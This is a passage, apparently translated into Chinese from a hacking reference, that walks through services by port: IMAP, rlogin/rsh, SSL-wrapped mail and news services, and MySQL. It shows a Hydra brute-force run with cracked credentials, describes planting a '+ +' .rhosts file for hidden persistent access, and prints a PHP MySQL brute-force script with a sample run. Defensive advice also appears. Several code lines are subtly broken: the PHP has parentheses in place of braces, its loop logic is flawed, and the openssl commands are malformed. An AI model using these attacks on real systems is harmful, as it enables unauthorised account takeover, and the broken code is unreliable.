

## IMAP2/IMAP4（Internet Message Access Protocol 2/4，互联网消息访问协议 2/4）：143（TCP）

IMAP2/4 是一种电子邮件访问协议，用于从邮件服务器访问电子邮件。其特点包括能够在远程位置存储电子邮件。

- **暴力破解**：IMAP 身份验证易受暴力破解攻击。

### 暴力破解 IMAP

可以使用 Hydra 对 IMAP 进行暴力破解：

```bash
$ hydra -L usernames.txt -P passwords.txt -s 143 192.168.1.1 imap
Hydra v2.2 (c) 2002 by van Hauser / THC - use allowed only for legal purposes.
Hydra is starting! [parallel tasks: 4, login tries: 4 (1:1/p:4)]
[143][imap] login: pardezi  password: estd1948!!
Hydra finished.
```

### 防止 IMAP 暴力破解

请参阅“暴力破解攻击的通用防御措施”。

- **嗅探**：有可能嗅探通过网络传输的 IMAP 流量。

### 嗅探 IMAP 流量

Ettercap 和 Ethereal 等网络嗅探工具可用于捕获网络上传输的 IMAP 数据。

### 安全替代方案

如果正在使用 IMAP，请考虑执行以下建议：

- 使用 SSH 为 IMAP 流量创建隧道：
    ```bash
    ssh -L143:127.0.0.1:143
    username@imapserver.somecompanyasanexample.com
    ```
- 使用 IMAPS 作为 IMAP 的安全替代品。

## HTTPS（Secure Hypertext Transfer Protocol，安全超文本传输协议）：443（TCP）

HTTPS 是建立在 SSL（Secure Sockets Layer，安全套接字层）之上的 HTTP。HTTPS 使用 SSL 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 **openssl** 工具连接到 HTTPS 服务器：

`openssl s_client -connect:server_ipaddress:443`

OpenSSL 可从 <http://www.openssl.org> 获取。

- **软件漏洞**：以下段落代表了一个近期的 OpenSSL 漏洞：
    - **OpenSSL SSLv2 缓冲区溢出**：OpenSSL 是 SSL 协议的开源实现。发现 0.9.6e 之前的 OpenSSL 版本存在缓冲区溢出漏洞，这可能导致在服务器上执行任意代码。详情请参阅 <http://www.kb.cert.org/vuls/id/102795>。

## rexec：512（TCP）

可以使用 rexec 命令在远程主机上运行命令并显示其输出。由于 rexec 使用与 rlogin 类似的机制，请参阅以下“rlogin: 513 (TCP)”章节。

## rlogin：513（TCP）

rlogin 命令用于与远程主机建立终端会话。

- **暴力破解**：由于需要用户名和密码组合来通过 rlogin 进行身份验证，因此可以使用 Hydra 等暴力破解工具。
- **嗅探**：rlogin 服务使用明文协议。Ettercap 或 Ethereal 等网络嗅探工具可用于嗅探网络上的 rlogin 流量。
- **rlogin 错误配置**：为了便于无密码登录，用户可能需要在主目录中放置一个名为 .rhosts 的文件，内容如下：

    `mukumouse.somecompanyasanexample.com jack`

    这将允许来自 mukumouse.somecompanyasanexample.com 的用户 jack 无需密码即可 rlogin 到放置上述 .rhosts 文件的主机上的其账户。

### .rhosts 错误配置

考虑用户主目录中内容如下 .rhosts 文件：

`+ +`

这样的文件允许任何主机的任何用户无需密码登录到该用户的账户。

> 在远程账户被攻陷后，入侵者可能会在受害者的主目录中放置一个内容为“+ +”的 .rhosts 文件，正如刚刚所示。这使得入侵者能够持续访问受害者的账户。此外，由于 .rhosts 文件以句点开头，当受害者用户使用 ls 命令进行目录列表时，该文件不会显示出来（除非用户在 ls 命令中指定了 -a 标志）。

### 禁用 rlogin 并考虑替代方案

如果正在运行 rlogin 服务，请考虑以下建议：

- 通过在 inetd.conf 文件中注释掉相应的行来禁用 rsh、rlogin 和 rexec 服务。
- 考虑使用 SSH 作为安全替代品。

## rsh：514（TCP）

rsh 命令用于在远程机器上执行命令。由于 rsh 使用与 rlogin 类似的机制，请参阅前面的“rlogin: 513 (TCP)”章节。

## NNTPS（Secure Network News Transfer Protocol，安全网络新闻传输协议）：563（TCP）

NNTPS 是建立在 SSL（Secure Sockets Layer，安全套接字层）之上的 NNTP。NNTPS 使用 SSL 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 openssl 工具连接到 NNTPS 服务器：

```
openssl s_client -connect:192.168.1.1:563
```

OpenSSL 可从 <http://www.openssl.org/> 获取。

请参阅“NNTP (Network News Transfer Protocol): 119 (TCP)”以获取更多详细信息。

## IMAPS（Secure Internet Message Access Protocol，安全互联网消息访问协议）：993（TCP）

IMAPS 是建立在 SSL（Secure Sockets Layer，安全套接字层）之上的 IMAP。IMAPS 使用 SSL 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 openssl 工具连接到 IMAPS 服务器：

```
openssl s_client -connect:192.168.1.1:993
```

OpenSSL 可从 <http://www.openssl.org/> 获取。

请参阅前面的章节“IMAP2/IMAP4 (Internet Message Access Protocol 2/4): 143 (TCP)”以获取更多详细信息。

## POP3S（Secure Post Office Protocol 3，安全邮政协议 3）：995（TCP）

POP3S 是建立在 SSL（Secure Sockets Layer，安全套接字层）之上的 POP3。POP3S 使用 SSL 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 openssl 工具连接到 POP3S 服务器以获取横幅信息：

```
openssl s_client -connect:192.168.1.1:995
```

OpenSSL 可从 <http://www.openssl.org/> 获取。

请参阅前面的章节“POP3 (Post Office Protocol 3): 110 (TCP)”以获取更多详细信息。

## NFS：2049（TCP 和 UDP）

请参阅前面的章节“Portmapper: 111 (TCP)”。

## MySQL：3306（TCP）

MySQL 是一个流行的开源数据库软件包。可从 <http://www.mysql.com> 获取。

- **暴力破解**：由于 MySQL 使用用户名和密码对进行身份验证，因此可以尝试对其进行暴力破解攻击。

### 暴力破解 MySQL

以下 PHP 脚本可用于对 MySQL 服务器进行暴力破解：

```php
<?php
/**Author: Nitesh Dhanjani [ hacknotes@dhani.com ]
This script attempts a brute-force attack on MySQL servers. Please make sure $usernamefile and $passwordfile are set to filenames containing usernames and passwords to attempt.*/

$usernamefile="usernames.txt";
$passwordfile="passwords.txt";

if($argc != 2)
(
    print "Usage: $argv[0] hostname\n";
    exit();
)

$uFilehandle=@fopen($usernamefile,"r");
$pFilehandle=@fopen($passwordfile,"r");

if ((!$uFilehandle)||(!$pFilehandle))
{
    print("Could not open username or password file.\n");
    exit();
}

while($username=@fscanf($uFilehandle,"%s\n"))
{
    while($password=@fscanf($pFilehandle,"%s\n"))
        if(@mysql_connect ($argv[1],$username[0],$password[0]))
            print("SUCCESS! : $username[0], $password[0]\n");
}

print("DONE\n");
?>
```

让我们将上述文件称为 mssqlbrute.php。以下是该脚本的一个使用示例：

```bash
$ php -f mssqlbrute.php msql.somecompanyasanexample.com
SUCCESS!: root, sqlMyP455!
DONE
```

PHP 编程语言解释器可从 <http://www.php.net/> 下载。

### 防止 MySQL 暴力破解

请参阅*“暴力破解攻击的通用防御措施”*。

- **嗅探**：MySQL 使用明文协议来建立客户端和服务器之间的连接。因此，网络段上的用户可以嗅探 MySQL 会话。

### 嗅探 MySQL 流量

可以使用 Ettercap 捕获认证过程中通过网络发送的 MySQL 哈希值（图 4-1）。此外，由于 MySQL 使用明文机制传输数据，因此可以监视用户会话
